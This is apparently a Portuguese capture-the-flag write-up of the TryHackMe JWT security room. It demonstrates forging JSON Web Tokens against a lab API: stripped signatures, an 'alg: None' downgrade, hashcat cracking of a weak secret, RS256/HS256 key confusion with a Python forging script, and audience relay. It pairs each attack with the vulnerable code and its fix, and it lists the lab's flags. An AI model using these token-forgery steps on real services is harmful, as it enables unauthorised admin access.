---
title: JWT - SECURITY - TRYHACKME
date: 2025-01-05 10:44:00
categories: [TRYHACKME, ROOMS, WEB APPLICATION PENTEST]
tags: [api,tryhackme,web,application,jwt,pentest]      # TAG names should always be lowercase
image: 
 path: /assets/img/posts/2025/01/room-JWT.png

---

# Objetivos

1. Aprender sobre autenticação baseada em token.
2. Aprender sobre JSON web tokens (JWTs).
3. Aprender o porque JWT são populares.
4. Aprender sobre segurança no uso de JWT.
5. Aprender como atacar vulnerabilidade na implementação de JWT.


## Introdução

Um dos motivos  da popularidade das API (Application Programming Interfaces) é sua vantagem  de ser usada em diversas interfaces diferentes, com uma única API podemos conversar com uma aplicação web ou mobile, simultaneamente se necessário, além disso, pensando pelo lado da segurança, podemos implementar controles mais centralizados do lado do servidor.
Nesse artigo irei estudar e documentar, a aula disponível de JWT na plataforma TryHackMe.

[Aula disponível aqui.](https://tryhackme.com/r/room/jwtsecurity)


## Gerenciamento de Sessão baseado em Token.

É algo relativamente novo, onde a aplicação web fornece um token dentro de uma requisição `body` , no lado do cliente o JavaScript lê essa informação e armazena o token localmente dentro da pasta do navegador. Quando o cliente realiza uma requisição o JavaScript carrega a informação do token armazenado localmente e anexa ao cabeçalho da requisição, o formato mais comum de token é o **JWT (JSON Web Token)**.

Formato do cabeçalho:
`Authorization: Bearer header`


### Projeto de API

A API para estudo e documentação foi desenvolvida em Python Flask, sendo assim os códigos dos exemplos serão em Python.

#### API Endpoints

O projeto de API tem um único endpoint, exemplo `http://HOST/api/v1.0/exampleX`, o `X` é substituído pelo exemplo que estamos estudando. O endpoint é acessado usando dois métodos HTTP.

 **POST**: Para autenticar e receber seu JWT você precisa realizar uma requisição POST, com as credenciais fornecidas em formato JSON.

 **GET**: Para obter detalhes sobre seu usuário e, executar a escalação de privilégios.

#### Credenciais de API

Para autenticar na API o payload em formato JSON deve ser enviado da seguinte forma:

 **username**: nome de usuário
 **password**: senha**X**

#### Exemplos de API

Abaixo duas requisições, utilizando o `curl`.
Para autenticação utilizamos a requisição abaixo:

```shell
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "passwordX" }' http://10.10.173.181/api/v1.0/exampleX
```


`Content-Type: application/json`:  cabeçalho utilizado para comunicação entre sistemas, por exemplo cliente servidor, ele informa para navegador como interpretar o conteúdo enviado.

Para verificação de usuário a requisição abaixo pode ser utilizada:

```shell
curl -H 'Authorization: Bearer [JWT token]' http://10.10.173.181/api/v1.0/example2?username=Y
```

Onde `Y` após parâmetro `username` pode ser `user` ou `admin`.

`JWT token` : deve ser substituído pela resposta da primeira requisição.


#### Exemplo de token

Quando realizamos uma requisição com usuário `user` recebemos um token, com usuário `admin` recebemos a mensagem de credenciais incorretas.

```shell
┌──(root㉿kali)-[/home/alex]
└─# 
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password1" }' http://10.10.173.181/api/v1.0/example1
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJwYXNzd29yZCI6InBhc3N3b3JkMSIsImFkbWluIjowLCJmbGFnIjoiVEhNezljYzAzOWNjLWQ4NWYtNDVkMS1hYzNiLTgxOGM4MzgzYTU2MH0ifQ.TkIH_A1zu1mu-zu6_9w_R4FUlYadkyjmXWyD5sqWd5U"
}

┌──(root㉿kali)-[/home/alex]
└─# 
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "admin", "password" : "password1" }' http://10.10.173.181/api/v1.0/example1
{
  "message": "Incorrect Username or Password"
}

```

#### What is the common header used to transport the JWT in a request?

Para respondermos a pergunta acima, basta sabermos como é a estrutura de uma requisição JWT e qual é o seu cabeçalho.

Resposta: `Authorization: Bearer header`

## JSON Web Tokens

JWT é um padrão aberto, fornecendo informações para desenvolvedores ou criadores de bibliotecas que queiram usar JWTs, a sua estrutura segue da seguinte maneira.

![Estrutura JWT](/assets/img/posts/2025/01/JWT-SCTRUCTURE.webp)

### Estrutura JWT

`Header`:  indica qual é o tipo de token e qual algoritmo está sendo utilizado.

`Payload`: corpo do token, contém informações  de reinvindicações, as reinvindicações são pré-definidas como sendo públicas ou privadas pelo padrão JWT.

`Signature`: a parte do token que fornece o método que será utilizado para garantir a autenticidade do token.

### Algoritmos de assinatura

Existem diversos algoritmos de assinatura, abaixo será explicado os principais.

`None`: significa que nenhum algoritmo de assinatura será utilizado, desta forma, JWT não será capaz de verificar a autenticidade do token.

`Symmetric Signing`: algoritmo simétrico, como HS265, criam uma assinatura e anexando um valor secreto para o cabeçalho e payload do JWT antes de gerar um valor em hash. A verificação de assinatura, pode ser executada por qualquer sistema que tenha em posse o valor secreto.

`Asymmetric Signing`: algoritmo de assinatura assimétrica, como RS256, cria uma assinatura usando uma chave privada, para assinar o cabeçalho e o payload do JWT, é criado gerando uma hash e depois criptografando a hash com a chave privada. A verificação pode ser realizada por qualquer sistema que tenha a chave pública.

### Segurança na assinatura

JWTs podem ser criptografados (chamadas  de JWEs), mas o poder principal dos JWTs vem da assinatura. Uma vez que um JWT é assinado, ele pode ser enviado ao cliente, que pode usar este JWT sempre que necessário, realizando dessa maneira um servidor centralizado de autenticação que cria JWT para diversas aplicações.

### Perguntas

#### HS256 is an example of what type of signing algorithm?

HS256 é utilizado para realizar assinaturas simétricas.

Resposta: `Symmetric`

#### RS256 is an example of what type of signing algorithm?

RS256 é utilizado para realizar assinaturas assimétricas.

Resposta: `Asymmetric`

#### What is the name used for encrypted JWTs?

O nome é JWEs

Resposta:`JWEs`

## Divulgação de informações confidenciais

O primeiro problema que iremos nos aprofundar é sobre a exposição de informações sensíveis dentro do JWT.

Em um gerenciamento de sessão baseado em `cookie` as informações são armazenadas em parâmetros do lado servidor, esses valores não são expostos do lado do cliente e podem ser recuperados somente do lado do servidor. Entretanto com tokens, as reinvindicações são expostas em JWT no lado do cliente, alguns exemplos de informações que podem ser expostas.

- Credenciais como senhas em hash, ou ainda pior, em texto claro.
- Exposição da rede interna, como endereços de hosts, hostname e servidores de autenticação.

### Exemplo 1

```shell
┌──(root㉿kali)-[/home/alex]
└─# 
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password1" }' http://10.10.63.229/api/v1.0/example1
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJwYXNzd29yZCI6InBhc3N3b3JkMSIsImFkbWluIjowLCJmbGFnIjoiVEhNezljYzAzOWNjLWQ4NWYtNDVkMS1hYzNiLTgxOGM4MzgzYTU2MH0ifQ.TkIH_A1zu1mu-zu6_9w_R4FUlYadkyjmXWyD5sqWd5U"
} 
```


Acima vemos a resposta da nossa requisição `POST` a API, nossa estrutura em JWT é montada, com caracter "." sendo o delimitador de cada campo.

`header:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9`

`Payload:eyJ1c2VybmFtZSI6InVzZXIiLCJwYXNzd29yZCI6InBhc3N3b3JkMSIsImFkbWluIjowLCJmbGFnIjoiVEhNezljYzAzOWNjLWQ4NWYtNDVkMS1hYzNiLTgxOGM4MzgzYTU2MH0ifQ`

`Signature: TkIH_A1zu1mu-zu6_9w_R4FUlYadkyjmXWyD5sqWd5U`

A decodificação do token pode ser realizada manualmente ou com ferramentas, na lição é fornecido a ferramenta [jwt io](https://jwt.io/).
Outra solução, que podemos executar localmente, é a ferramenta [Cyber Chef](https://cyberchef.org/)

Resultado da nossa decodificação.

![JWT-IO](/assets/img/posts/2025/01/JWT-IO.webp)

### Erros de desenvolvimento

Exemplo de informações confidenciais sendo fornecidas após requisição.

```python
payload = { 
	"username" : username, 
	"password" : password, 
	"admin" : 0, 
	"flag" : "[redacted]" 
	} 

access_token = jwt.encode(payload, self.secret, algorithm="HS256")
```


#### Correção

Informações valiosas não podem ser adicionadas na resposta do JWT que será enviado para o lado do cliente, ao invés disso, esses valores devem ficar armazenados no lado do servidor, quando requisitados, o nome de usuário pode ser lido pelo JWT verificador , que realiza um lookup desses valores.

```python
payload = jwt.decode(token, self.secret, algorithms="HS256") 
username = payload['username'] 
flag = self.db_lookup(username, "flag")
```


**payload = jwt.decode(token, self.secret, algorithms="HS256")**:

- Decodifica o token JWT utilizando a chave secreta (`self.secret`) e o algoritmo HS256.
- O resultado da decodificação é um payload, que é um dicionário contendo as informações contidas no token.

**username = payload['username']**:

- Extrai o valor associado à chave 'username' do payload. Esse valor é armazenado na variável `username`.

**flag = self.db_lookup(username, "flag")**:

- Realiza uma busca na base de dados (`self.db_lookup`) utilizando o `username` e a chave "flag".
- O resultado dessa busca é armazenado na variável `flag`.

### Pergunta
#### What is the flag for example 1?

A resposta foi encontrada quando realizamos a requisição e decodificamos o JWT.

Resposta: `THM{9cc039cc-d85f-45d1-ac3b-818c8383a560}`

## Erros de validação de assinatura

### Assinaturas que não são verificadas

Quando assinatura JWT não é verificada pelo servidor o atacante pode alterar o JWT, dessa forma o atacante pode ser qualquer usuário que ele deseja. 
Embora a não validação de assinatura seja uma falha raríssima, ela pode ser encontrada em único endpoint, pouco utilizado ou esquecido na aplicação como sendo, por exemplo, uma aplicação descontinuada.

#### Exemplo 2

Primeiro precisamos autenticar na aplicação.

```shell
┌──(root㉿kali)-[/home/alex]
└─# 
curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password2" }' http://10.10.81.80/api/v1.0/example2
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4"
}
```

É gerado nosso JWT, agora vamos verificar se nosso usuário está autenticado.

```shell
┌──(root㉿kali)-[/home/alex]
└─# 
curl -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.UWddiXNn-PSpe7pypTWtSRZJi1wr2M5cpr_8uWISMS4' \
 http://10.10.81.80/api/v1.0/example2?username=user
{
  "message": "Welcome user, you are not an admin"
}
```

Confirmado que estamos autenticado, já sabemos como é montada a estrutura do JWT, vamos remover nossa assinatura do JWT e ver como aplicação lida com isso.

```shell
┌──(root㉿kali)-[/home/alex]
└─# 
curl -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.' \       
 http://10.10.81.80/api/v1.0/example2?username=user
{
  "message": "Welcome user, you are not an admin"
}
```

Mesmo sem nossa assinatura permanecemos autenticados, isso demonstra que a API não realiza validação de assinatura. Agora iremos verificar se conseguimos alterar nosso usuário para `admin`.
Primeiro iremos realizar o decodificação do nosso JWT.

![JWT EXAMPLE 2](/assets/img/posts/2025/01/JWT-example2-1.webp)

No payload do JWT iremos alterar para `1`, o valor do campo `admin`.

![JWT EXAMPLE 2-2](/assets/img/posts/2025/01/JWT-example2-2.webp)

Realizado a alteração, agora realizaremos uma nova requisição, para verificar se conseguimos alterar nosso usuário.

```shell
┌──(root㉿kali)-[/home/alex]
└─# 
curl -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.q8De2tfygNpldMvn581XHEbVzobCkoO1xXY4xRHcdJ8' \
 http://10.10.81.80/api/v1.0/example2?username=admin
{
  "message": "Welcome admin, you are an admin, here is your flag: THM{6e32dca9-0d10-4156-a2d9-5e5c7000648a}"
}
```

Com isso validamos que a aplicação possui uma falha crítica, não é verificado assinaturas do JWT.

#### Desenvolvimento do erro

Exemplo abaixo mostra a falha de desenvolvimento para não verificar assinatura.

```python
payload = jwt.decode(token, options={'verify_signature': False})
```

Embora isso seja raro acontecer entre cliente e servidor, em aplicações entre servidores não é, um atacante com acesso direto ao backend do servidor poderia forjar um JWT facilmente.

#### Correção

O JWT sempre deve verificar assinatura e ou adicionar autenticação de dois fatores, JWT pode verificar fornecendo um chave secreta (ou pública), exemplo de código seguro.

```python
payload = jwt.decode(token, self.secret, algorithms="HS256")
```

### Downgrading para None

Outra tipo de falha na assinatura de algoritmos é downgrade para `None`, isso significa que a aplicação não utiliza nenhum tipo de assinatura. Essa opção foi pensada para ser utilizada em comunicação de servidores, onde assinatura do JWT já foi verificada no ínicio da comunicação, sendo assim, o segundo servidor não precisa solicitar a validação de assinatura. Porém, alguns desenvolvedores não travam ou não negam ela quando a requisição é feita, dessa forma, basta o atacante alterar o JWT para verificação de assinatura sempre retornar `true`.

#### Exemplo 3

Para esse exemplo teremos que autenticar na aplicação primeiro.

```shell
┌──(root㉿estudos)-[/home/alex]
└─# 
curl -H 'Content-Type: application/json' \
     -X POST -d '{ "username" : "user", "password" : "password3" }' \
     http://10.10.86.110/api/v1.0/example3
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8"
}
```

Agora precisamos alterar o tipo de algoritmo de verificação do campo `alg`para `None`.
O cabeçalho do JWT está em **URL encode base64**  conforme mostrado usando CyberChef.

![JWT EXAMPLE 3-1](/assets/img/posts/2025/01/JWT-example3.webp)

Para alteramos o tipo de algoritmo basta realizamos o inverso usando **Base64 encode**.

`{"typ":"JWT","alg":"None"}`:`eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0`

![JWT EXAMPLE 3-2](/assets/img/posts/2025/01/JWT-example3-2.webp)

Feito a alteração do cabeçalho ainda precisamos alterar o valor do campo `admin` para `1`, para isso utilizaremos a ferramenta [jwt io](https://jwt.io/) novamente.

![JWT EXAMPLE 3-3](/assets/img/posts/2025/01/JWT-example3-3.webp)

Agora com o valor definido como 1 e `alg`como `None` podemos montar nosso JWT.

- Novo cabeçalho: `eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0`
- Payload: `eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0`
- Assinatura: `_yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8`

Precisamos ainda alterar nosso usuário que é passado na URL para `admim`, com isso podemos realizar o teste e verificar a vulnerabilidade.


```shell
┌──(root㉿estudos)-[/home/alex]
└─# 
curl -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0._yybkWiZVAe1djUIE9CRa0wQslkRmLODBPNsjsY8FO8' \
 http://10.10.86.110/api/v1.0/example3?username=admin
{
  "message": "Welcome admin, you are an admin, here is your flag: THM{fb9341e4-5823-475f-ae50-4f9a1a4489ba}"
}
```

#### Desenvolvimento do erro

Na perspectiva do desenvolvedor, a implementação da aplicação deve suportar diversos tipos de algoritmos de verificação, a implementação normalmente então lê o cabeçalho do JWT, realiza um parse em busca do campo `alg` (mostrado no código abaixo).
Entretanto o atacante especifica `None` como algoritmo, com isso a verificação de assinatura é ignorada.

```python
header = jwt.get_unverified_header(token) 
signature_algorithm = header['alg'] 
payload = jwt.decode(token, self.secret, algorithms=signature_algorithm)
```
#### Correção

Se a API precisa suportar diversos algoritmos o ideal é informa-los, declarando-os na função de decodificação, como é mostrado no exemplo abaixo.

```python
payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512"]) username = payload['username'] 
flag = self.db_lookup(username, "flag")
```

### Segredos simétricos fracos

Quando usamos um algoritmo de segredo simétrico a segurança do JWT é confiada a entropia e a "força" que o segredo usa. Dessa forma, se o segredo for fraco, podemos utilizar um ataque de dicionario para tentar quebra-lo, podendo assim alterar o JWT.

#### Exemplo 4

Primeiro vamos gerar nosso JWT.

```shell
┌──(root㉿estudos)-[/home/alex]
└─# 
curl -H 'Content-Type: application/json' \                                                                                                        
     -X POST -d '{ "username" : "user", "password" : "password4" }' \
     http://10.10.86.110/api/v1.0/example4
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.yN1f3Rq8b26KEUYHCZbEwEk6LVzRYtbGzJMFIF8i5HY"
}
```

Após obtemos nosso JWT já podemos tentar quebra-lo, no caso, iremos usar a mesma ferramenta que a aula orienta, mas podemos utilizar o John para essa tarefa também caso necessário.

- Salvar o JWT em um arquivo.
- Realizar o download da wordlist que usaremos no ataque.
- Uitilizar o hashcat: `hashcat -m 16500 -a 0 jwt.txt jwt.secrets.list`

O segredo é quebrado, com isso podemos alterar o JWT e forjar um acesso com usuário `admin`.

Segredo:`secret`

![JWT EXAMPLE 4](/assets/img/posts/2025/01/JWT-example4.webp)

Com a ferramenta [jwt io](https://jwt.io/) realizamos nossa alteração do JWT.

![JWT EXAMPLE 4](/assets/img/posts/2025/01/JWT-example4-1.webp)

Com nosso JWT alterado realizamos uma requisição e verificamos se conseguimos obter o acesso administrativo.

```shell
┌──(root㉿estudos)-[/FolderShare/Tryhack Me/JWT-rooms]
└─# 
curl -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.gpHtgNe4OSgiQHuf8W7JFfSNTi9tEnDKvK7QAk2DFBc' \
 http://10.10.86.110/api/v1.0/example4?username=admin
{
  "message": "Welcome admin, you are an admin, here is your flag: THM{e1679fef-df56-41cc-85e9-af1e0e12981b}"
}
```

#### Desenvolvimento do erro

O erro ocorre no desenvolvimento de segredos fracos, tornando assim sua quebra ser fácil.

#### Correção

Utilizar criação de segredos por algoritmos fortes e não por humanos, strings longas e aleatórias.

### Confundindo o algoritmo de assinatura

O ataque ocorre em um downgrade forçado de algoritmo de assinatura, basicamente ocorre uma confusão entre algoritmo simétrico e assimétrico, exemplo, se o algoritmo assimétrico sendo usado é `RS256` pode ser feito o downgrade para `HS256`, nesse caso algumas bibliotecas padrão voltam usando chave pública como sendo o segredo para o algoritmo simétrico de assinatura, sabendo a chave pública podemos forjar uma assinatura válida usando algoritmo `HS256` combinando-o com a chave pública.

#### Example 5

Como de costume vamos primeiro gerar nosso JWT.

```shell
┌──(root㉿estudos)-[/FolderShare/Tryhack Me/JWT-rooms]
└─#  curl -H 'Content-Type: application/json'\
  -X POST -d '{ "username" : "user", "password" : "password5" }' \
  http://10.10.86.110/api/v1.0/example5
{
  "public_key": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHSoarRoLvgAk4O41RE0w6lj2e7TDTbFk62WvIdJFo/aSLX/x9oc3PDqJ0Qu1x06/8PubQbCSLfWUyM7Dk0+irzb/VpWAurSh+hUvqQCkHmH9mrWpMqs5/L+rluglPEPhFwdL5yWk5kS7rZMZz7YaoYXwI7Ug4Es4iYbf6+UV0sudGwc3HrQ5uGUfOpmixUO0ZgTUWnrfMUpy2dFbZp7puQS6T8b5EJPpLY+iojMb/rbPB34NrvJKU1F84tfvY8xtg3HndTNPyNWp7EOsujKZIxKF5/RdW+Qf9jjBMvsbjfCo0LiNVjpotiLPVuslsEWun+LogxR+fxLiUehSBb8ip",
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MH0.kR4DjBkwFE9dzPNeiboHqkPhs52QQgaHcC2_UGCtJ3qo2uY-vANIC6qicdsfT37McWYauzm92xflspmSVvrvwXdC2DAL9blz3YRfUOcXJT03fVM7nGp8E7uWSBy9UESLQ6PBZ_c_dTUJhWg35K3d8Jao2czC0JGN3EQxhcCGtxJ1R7T9tzBMaqW-IRXfTCq3BOxVVF66ePEfvG7gdyjAnWrQFktRBIhU4LoYwem3UZ7PolFf0v2i6jpnRJzMpqd2c9oMHOjhCZpy_yJNl-1F_UBbAF1L-pn6SHBOFdIFt_IasJDVPr1Ybv75M26o8OBwUJ1KK_rwX41y5BCNGcks9Q"
}

```

Recebemos nosso JWT com a pública key, o algoritmo sendo utilizado é `RS256`, agora vamos realizar o downgrade utilizando a chave pública e programa em python fornecido.

```python
import jwt 

public_key = "ADD_KEY_HERE" 

payload = { 'username' : 'user', 'admin' : 1 } 
access_token = jwt.encode(payload, public_key, algorithm="HS256") 

print (access_token)
```

Conforme é mencionado na aula, antes de executar nosso script precisamos realizar algumas alterações na biblioteca `jwt`, nesse caso vamos usar a própria máquina virtual da plataforma.

- Editar o arquivo `/usr/lib/python3/dist-packages/jwt/algorithms.py`.
- Comentar as linhas 143 até 146.

![JWT EXAMPLE 5](/assets/img/posts/2025/01/JWT-example5.webp)

Após isso executamos nosso script e obtemos nosso JWT.

```shell
root@ip-10-10-69-152:~# 
python3 JWT.py 
b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.7jJBvWpF9JT4DdeUWnl0o7imBV0wa0HTDPRMavGbPyU'
```

Agora podemos realizar a requisição.

```shell
┌──(root㉿estudos)-[/FolderShare/Tryhack Me/JWT-rooms]
└─# 
curl -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.7jJBvWpF9JT4DdeUWnl0o7imBV0wa0HTDPRMavGbPyU' \
 http://10.10.86.110/api/v1.0/example5?username=admin
{
  "message": "Welcome admin, you are an admin, here is your flag: THM{f592dfe2-ec65-4514-a135-70ba358f22c4}"
```

#### Desenvolvimento do erro

O erro neste exemplo é semelhante ao do exemplo 3, mas um pouco mais complexo. Embora o algoritmo `None` não seja permitido, o problema principal decorre de algoritmos de assinatura simétrica e assimétrica sendo permitidos, conforme mostrado no exemplo abaixo:

```shell
payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512", "RS256", "RS384", "RS512"])
```

#### Correção

É necessário inserir um pouco mais de lógica no código para que não haja confusão.

```python
header = jwt.get_unverified_header(token)

algorithm = header['alg'] 
payload = "" 

if "RS" in algorithm: 
 payload = jwt.decode(token, self.public_key, algorithms=["RS256", "RS384", "RS512"]) 
elif "HS" in algorithm: 
 payload = jwt.decode(token, self.secret, algorithms=["HS256", "HS384", "HS512"]) 
 
 username = payload['username'] 
 flag = self.db_lookup(username, "flag")
```

### Perguntas

No decorrer dessas lições já obtemos as `flags` para responder todas as perguntas.

## Duração de JWT

O tempo de vida de um token deve ser calculado antes da verificação da sua assinatura, o campo `exp`define o tempo de vida do token e, verifica se o token em questão ainda é válido. Um problema frequente é o valor de expiração ser muito longo ou até mesmo não ser definido (nunca expirar). 

Uma forma citada na aula, para expirar o token antes do tempo definido, seria manter uma lista de tokens a serem bloqueados (serve-side), porém isso quebraria o propósito dos JWTs em serem descentralizados. Sendo assim, o ideal e recomendado é definir corretamente o tempo de expiração de cada token, para cada aplicação diferente.

### Exemplo 6

Nesse exemplo já temos nosso JWT, nesse caso basta realizarmos um requisição para API para obter a `flag`.

```shell
┌──(root㉿estudos)-[/FolderShare/Tryhack Me/JWT-rooms]
└─# 
curl -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MX0.ko7EQiATQQzrQPwRO8ZTY37pQWGLPZWEvdWH0tVDNPU' \
 http://10.10.86.110/api/v1.0/example6?username=admin
{
  "message": "Welcome admin, you are an admin, here is your flag: THM{a450ae48-7226-4633-a63d-38a625368669}"
}
```

### Desenvolvimento do erro

Definir um valor para o token expirar, como mencionado, caso não seja definido o token será persistente (nunca expira).

### Correção

O código abaixo demonstra a forma de corrigir a vulnerabilidade.

```python
lifetime = datetime.datetime.now() + datetime.timedelta(minutes=5) 

payload = { 
		   'username' : username, 
		   'admin' : 0, 
		   'exp' : lifetime } 
access_token = jwt.encode(payload, self.secret, algorithm="HS256")
```

## Cross-Service Relay Attacks

O ataque ocorre quando um JWT é gerado e reutilizado em outra aplicação, que o emissor não deveria ter acesso com aquele JWT. Isso pode acontecer quando o serviço receptor não verifica corretamente o **emissor** (issuer) e o **público** (audience) do token.
Outro exemplo é um JWT com `admin:true`, onde o usuário possui privilégios administrativos na primeira aplicação, se aplicação não realizar as devidas verificações, o atacante pode tentar se passar como usuário que possui privilégios administrativos nessa segunda aplicação, sendo que não deveria ter essas permissões.

### Exemplo 7

Para esse exemplo teremos duas aplicações,  `example7_appA` e `example7_appB`, além disso teremos mais um campo em nossa requisição: `application : appX`

Primeiro vamos gerar nosso token no servidor centralizado de autenticação: `example7`, para a aplicação A.

```shell
┌──(root㉿estudos)-[/home/alex]
└─# 
curl -H 'Content-Type: application/json'\
  -X POST -d '{ "username" : "user", "password" : "password7", "application" : "appA"}' \
  http://10.10.86.110/api/v1.0/example7
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MCwiYXVkIjoiYXBwQSJ9.sl-84cMLYjxsD7SCySnnv3J9AMII9NKgz0-0vcak9t4"
}
```

Analisando o JWT vemos que temos um novo campo  no payload: `aud`

```text
{
  "username": "user",
  "admin": 0,
  "aud": "appA"
}
```

Realizando uma requisição com esse JWT para aplicação A recebemos a resposta da aplicação.

```shell
┌──(root㉿estudos)-[/home/alex]
└─# 
curl -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MCwiYXVkIjoiYXBwQSJ9.sl-84cMLYjxsD7SCySnnv3J9AMII9NKgz0-0vcak9t4' \
http://10.10.86.110/api/v1.0/example7_appA?username=user
{
  "message": "Welcome user, you are not an admin"
}
```

Realizando a mesma requisição, agora para a aplicação B nosso token não é aceito.

```shell
┌──(root㉿estudos)-[/home/alex]
└─# 
curl -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MCwiYXVkIjoiYXBwQSJ9.sl-84cMLYjxsD7SCySnnv3J9AMII9NKgz0-0vcak9t4' \
http://10.10.86.110/api/v1.0/example7_appB?username=user
{
  "message": "JWT could not be read: Invalid audience"
}
```

Agora iremos gerar um novo JWT, porém para a aplicação B.

```shell
┌──(root㉿estudos)-[/home/alex]
└─# 
curl -H 'Content-Type: application/json'\
  -X POST -d '{ "username" : "user", "password" : "password7", "application" : "appB"}'\
  http://10.10.86.110/api/v1.0/example7
{
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o"
}
```

Assim como anteriormente nosso payload possui o campo `aud` e além disso temos privilégios administrativos.

```text
{
  "username": "user",
  "admin": 1,
  "aud": "appB"
}
```

Nosso JWT é lido normalmente pela aplicação B.

```shell
┌──(root㉿estudos)-[/home/alex]
└─# 
curl -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o' \
http://10.10.86.110/api/v1.0/example7_appB?username=admin
{
  "message": "Welcome admin, you are an admin, but there is no flag for you here"
}
```

Agora vamos tentar utiliza-lo para tentar acessar a aplicação A.

```shell
┌──(root㉿estudos)-[/home/alex]
└─# 
curl -H 'Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o' \
http://10.10.86.110/api/v1.0/example7_appA?username=admin
{
  "message": "Welcome admin, you are an admin, here is your flag: THM{f0d34fe1-2ba1-44d4-bae7-99bd555a4128}"
}
```

Com isso recebemos nossa `flag` e é mostrado na prática a falta de verificação, possibilitando uma escalada de privilégios.
### Desenvolvimento do erro

Não existe verificação no campo `aud` , isso pode ocorrer por desativação ou definição no campo deixando amplo para diversas aplicações.

### Correção

Conforme a lição menciona, o payload do JWT deve ser checado após decodificação, exemplo de código de checagem.

```python
payload = jwt.decode(token, self.secret, audience=["appA"], algorithms="HS256")
```


# Conclusão

A aula aborda assuntos importantes sobre JSON Web Token (JWT), explicando seu propósito e informando sobre os principais algoritmos utilizados para a segurança do token. Há um aprofundamento nas falhas de implementações, destacando vulnerabilidades na prática. Assim, consolida-se o conhecimento sobre o funcionamento do JWT e como aplicar boas práticas para garantir a segurança.


